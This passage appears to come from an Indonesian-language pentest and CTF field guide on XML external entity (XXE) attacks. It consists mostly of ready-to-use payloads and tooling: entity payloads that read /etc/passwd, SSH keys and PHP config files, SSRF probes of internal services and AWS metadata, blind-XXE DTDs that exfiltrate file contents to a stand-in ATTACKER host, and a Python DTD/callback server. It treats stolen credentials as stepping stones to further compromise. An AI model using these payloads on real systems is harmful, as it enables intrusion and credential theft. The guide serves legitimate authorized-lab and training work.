    http://internal-service/ → pivot ke target baru

XXE + SSH Key
    file:///home/user/.ssh/id_rsa → direct SSH access

XXE + AWS Metadata
    http://169.254.169.254/... → IAM credentials → AWS CLI access
```

---

### Billion Laughs (DoS Context)

```xml
<!ENTITY a "A">
<!ENTITY b "&a;&a;&a;&a;">
<!ENTITY c "&b;&b;&b;&b;">
<!ENTITY d "&c;&c;&c;&c;">
<!-- setiap level berlipat 4x → exponential memory expansion -->
```

> **Defensive indicator:** Jika parser **tidak crash** saat kamu submit entity expansion → ada mitigasi expansion limit. Itu adalah **temuan positif** (parser dilindungi). Catat sebagai finding, bukan failure.

---

## 🧰 Tools & Scripts

### Burp Suite — Key Tabs & Shortcuts

|Tab|Fungsi di XXE|
|---|---|
|Proxy → HTTP History|Temukan semua XML requests|
|Proxy → Intercept|Tangkap request sebelum dikirim|
|Repeater|Modifikasi dan kirim ulang payload|
|Intruder|Port sweep via SSRF, fuzzing entity values|
|Collaborator|OOB callback untuk Blind XXE (Pro only)|
|Decoder|Encode/decode URL, base64|

**Key Repeater Tips:**

```text
- Ctrl+U → URL-encode selection
- Inspector panel → parse request/response lebih mudah
- "Follow redirects" → aktifkan jika response redirect
- Content-Length otomatis di-update saat kamu Send
- Ctrl+S → save request ke history
```

---

### OOB Listener Quick Setup

**Python HTTP Server (simple):**

```bash
mkdir -p ~/xxe_loot/dtd
cd ~/xxe_loot/dtd
python3 -m http.server 8000
# Log tampil di terminal: IP, path, timestamp
```

**Interactsh (external callback, gratis):**

```bash
# Install
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
export PATH=$PATH:$(go env GOPATH)/bin

# Run
interactsh-client
# Output: c1234567890abcdef.oast.fun
```

Gunakan domain di payload Burp Repeater. Callback langsung muncul di terminal.

---

### xxe_dtd_server.py

Script Python untuk serve DTD dan log callbacks secara terstruktur:

```python
#!/usr/bin/env python3

from http.server import BaseHTTPRequestHandler, HTTPServer
from datetime import datetime, timezone
from urllib.parse import urlparse, parse_qs
import argparse
import ipaddress
import sys


DTD_TEMPLATE = """<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://{host}:{port}/?d=%file;'>">
%eval;
%send;
"""


class DTDHandler(BaseHTTPRequestHandler):

    server_version = "XXE-Lab-Server/1.0"

    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)

        timestamp = datetime.now(timezone.utc).isoformat()
        client_ip = self.client_address[0]

        print("\n" + "=" * 60)
        print("XXE CALLBACK")
        print("=" * 60)
        print(f"Timestamp : {timestamp}")
        print(f"Client IP : {client_ip}")
        print(f"Path      : {parsed.path}")

        data = params.get("data", []) or params.get("d", [])
        if data:
            print(f"Data      : {data[0]}")
        else:
            print("Data      : <none>")

        if parsed.path == "/xxe.dtd":
            dtd = DTD_TEMPLATE.format(
                host=self.server.callback_host,
                port=self.server.callback_port
            )
            body = dtd.encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/xml-dtd")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            self.wfile.write(body)
            return

        body = b"OK\n"
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, fmt, *args):
        return


def main():
    parser = argparse.ArgumentParser(
        description="Simple XXE DTD/callback server for authorized labs."
    )
    parser.add_argument("-p", "--port", type=int, default=8000)
    parser.add_argument("--bind", default="0.0.0.0")
    parser.add_argument("--callback-host", required=True)
    parser.add_argument("--callback-port", type=int, required=True)
    args = parser.parse_args()

    server = HTTPServer((args.bind, args.port), DTDHandler)
    server.callback_host = args.callback_host
    server.callback_port = args.callback_port

    print(f"[*] Listening on {args.bind}:{args.port}")
    print(f"[*] DTD URL: http://{args.callback_host}:{args.callback_port}/xxe.dtd")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Stopping server...")
    finally:
        server.server_close()


if __name__ == "__main__":
    main()
```

**Jalankan:**

```bash
python3 xxe_dtd_server.py \
  --port 8000 \
  --callback-host ATTACKER_IP \
  --callback-port 8000
```

**Expected output:**

```text
[*] Listening on 0.0.0.0:8000
[*] DTD URL: http://ATTACKER:8000/xxe.dtd
```

Port sudah dipakai? → `kill $(lsof -ti:8000)` lalu restart.

---

### xxeinjector

Automated XXE testing tool. Berguna setelah XXE dikonfirmasi untuk sweep file.

```bash
# Simpan request dari Burp: klik kanan request → Save item
# Jalankan terhadap request file tersebut
xxeinjector --help
```

> Cek `--help` selalu — syntax berbeda antar versi.

---

## 🏃 Quick CTF Recipe

Ditemukan endpoint XML? Gunakan urutan ini:

**Setup (jalankan sekali):**

```bash
export TARGET="http://10.10.11.200"
mkdir -p ~/xxe_loot/dtd && cd ~/xxe_loot/dtd
```

**Step 1 — Baseline** (di Burp Repeater):

```xml
<?xml version="1.0"?>
<root><value>BASELINE_TEST</value></root>
```

→ `BASELINE_TEST` muncul di response? Parser menerima XML.

**Step 2 — Internal Entity:**

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test "XXE_123">]>
<root><value>&test;</value></root>
```

→ `XXE_123` muncul? Entity processing aktif.

**Step 3 — File Read:**

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root><value>&xxe;</value></root>
```

→ Hostname muncul? **XXE confirmed!** Lanjut baca `/etc/passwd`, config files.

**Step 4 — Blind XXE (jika output tidak terlihat):**

```bash
# Terminal 1
cat > ~/xxe_loot/dtd/xxe.dtd << 'EOF'
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://ATTACKER:8000/?d=%file;'>">
%eval;
%send;
EOF
python3 -m http.server 8000
```

Payload di Repeater:

```xml
<?xml version="1.0"?>
<!DOCTYPE root SYSTEM "http://ATTACKER:8000/xxe.dtd">
<root><value>test</value></root>
```

→ Callback masuk di terminal? Data di-exfil via OOB.

**Step 5 — SSRF (probe internal):**

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">
]>
<root><value>&xxe;</value></root>
```

→ HTML/JSON internal muncul? Internal service ditemukan.

---

## ⚡ Quick Reference — Payload Cheatsheet

```xml
<!-- Basic File Read -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>

<!-- SSRF ke internal -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
    <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">
]>
<root><data>&xxe;</data></root>

<!-- OOB Connectivity Test -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
    <!ENTITY xxe SYSTEM "http://ATTACKER:8000/test">
]>
<root><data>&xxe;</data></root>

<!-- Blind XXE via External DTD -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo SYSTEM "http://ATTACKER:8000/xxe.dtd">
<root><data>test</data></root>

<!-- Error-Based (no outbound) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
    %eval;
    %error;
]>
<root><data>test</data></root>

<!-- XInclude (DOCTYPE blocked) -->
<?xml version="1.0" encoding="UTF-8"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/>
</root>

<!-- PHP Wrapper (base64) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
]>
<root><data>&xxe;</data></root>

<!-- Repurposing Local DTD -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
    '>
    %local_dtd;
]>
<root><data>test</data></root>
```

**External DTD content (xxe.dtd di server attacker):**

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://ATTACKER:8000/?d=%file;'>">
%eval;
%send;
```

---

## 🛠️ Troubleshooting

|Evidence|Possible Cause|Diagnosis & Action|
|---|---|---|
|`DOCTYPE is disallowed`|Parser menolak DTD|Coba XInclude (Fase 1.4). Jika blocked juga → file upload path|
|Entity literal muncul (`&test;`)|Entity processing disabled|Bedakan dulu: cek apakah DOCTYPE diproses sama sekali|
|`Permission denied` membaca file|Process tidak punya permission|Coba `/etc/hostname`, `/etc/hosts`, `/proc/version` dulu|
|File muncul tapi XML rusak/kosong|File mengandung `<`, `>`, `&`|Gunakan `php://filter/convert.base64-encode`|
|DTD request masuk, tidak ada data callback|Parameter entity nesting restricted di parser ini|Pastikan nesting via External DTD, bukan Internal DTD|
|OOB callback tidak sampai (HTTP)|Egress firewall|Coba DNS callback via Burp Collaborator atau interactsh|
|OOB DNS juga tidak sampai|Strict egress filtering|Gunakan Error-Based (3.4) atau Local DTD repurpose (Fase 6)|
|SVG upload ditolak|Extension/MIME validation|Coba ubah `Content-Type: image/svg+xml` di Burp Repeater|
|SVG diterima tapi tidak trigger XXE|Server tidak proses XML server-side (hanya kirim ke browser)|Cari server-side conversion endpoint (thumbnail generator, preview API)|
|DOCX tidak trigger XXE|Library Office modern sudah disable external entities|Cek versi library — tidak bisa di-bypass jika hardened|
|ZIP corruption setelah edit DOCX|Archive structure rusak saat repack|Pastikan `zip -r` dari dalam directory, bukan dari parent|
|Error-based tidak menampilkan data|Parser tidak verbose di error|Parser mungkin strip error detail — coba OOB approach|
|Local DTD path tidak ada|Server pakai distro berbeda|Enumerate path lain di common paths list (Fase 6.1)|
|`ISOamso` entity tidak ada|Versi DTD berbeda|Baca isi DTD yang ditemukan untuk cari entity yang bisa di-override|
|AWS metadata 401|IMDSv2 aktif|Tidak bisa via XXE (butuh PUT + header token)|
|Port sweep tidak memberi hasil jelas|Error/timing seragam|Bandingkan response length, bukan hanya status code|
|base64 output rusak|Response JSON-encoding whitespace|Copy raw response dari Burp Response tab, strip whitespace sebelum decode|
|Python server port sudah dipakai|Konflik port|`kill $(lsof -ti:8000)` lalu restart|
|`SOAP returns 415`|Content-Type salah|Ganti `text/xml` ↔ `application/soap+xml`|
|Billion Laughs tidak crash parser|Expansion limit aktif|Itu mitigasi — catat sebagai temuan positif|
|SAML tidak vulnerable ke XXE|Signature/validation error berbeda dari XXE|Pisahkan analysis SAML auth logic dari XML entity processing|
|XInclude tidak bekerja|XInclude disabled di parser|Tidak ada bypass langsung — cari attack surface lain|
|Parameter entity error|`%name;` dipanggil di luar DTD context|Parameter entity hanya valid di DTD, bukan di XML document body|

---

## ✅ Final Checklist

```text
[ ] Endpoint menerima XML teridentifikasi (Burp HTTP History)
[ ] Normal XML request berhasil — baseline confirmed (Fase 1.1)
[ ] Internal entity di-resolve — DOCTYPE processing aktif (Fase 1.2)
[ ] External entity file:/// bekerja — XXE confirmed (Fase 1.3)
[ ] File sensitif dibaca: hostname → passwd → config/keys (Fase 2.1)
[ ] PHP wrapper dicoba jika file mengandung karakter XML spesial (Fase 2.2)
[ ] Error channel diperiksa — ada pesan parser di 4xx/5xx?
[ ] OOB connectivity dikonfirmasi via HTTP (Fase 3.2)
[ ] External DTD di-setup dan di-test (python3 -m http.server)
[ ] Blind XXE data exfil dicoba jika direct output tidak ada (Fase 3.3)
[ ] Error-based dicoba jika no outbound (Fase 3.4)
[ ] SSRF probe internal services (Fase 4.1 + Burp Intruder port sweep)
[ ] Cloud metadata dicek jika target di cloud (Fase 4.2)
[ ] XInclude dicoba jika DOCTYPE diblok (Fase 1.4)
[ ] SVG upload dicoba jika ada file upload (Fase 5A)
[ ] DOCX/XLSX dicoba jika ada document upload (Fase 5B)
[ ] Local DTD repurposing dicoba jika no outbound (Fase 6)
[ ] SOAP endpoint dikonfirmasi (SOAPAction header ada?)
[ ] SAML flow dibedakan dari OIDC/OAuth
[ ] Evidence di Burp Repeater disimpan (klik kanan → Save item)
[ ] PoC reproducible dan terdokumentasi
```

---

## → Cross-Workflow Links

Setelah XXE berhasil dan mendapat artifact:

|Artifact Ditemukan|Next Workflow|
|---|---|
|DB credentials dari config file|[14a. MySQL & MariaDB Exploitation Workflow — Master Field Guide](/docs/mysql) / [Pentest Workflow: Microsoft SQL Server (MSSQL) Exploitation](/docs/mssql)|
|SSH private key|[06. SSH Exploitation & Tunneling Workflow — Master Field Guide](/docs/ssh)|
|SSRF ke internal service|[🌐 22 — SSRF Workflow](/docs/ssrf)|
|AWS IAM credentials|[🚀 Bagian 0: Konteks & Lab Setup](/docs/aws-pentest)|
|User list + shells dari /etc/passwd|[07. FTP & FTPS Exploitation Workflow — Master Field Guide](/docs/ftp)|

---

_[File 22: SSRF →](/docs/ssrf)_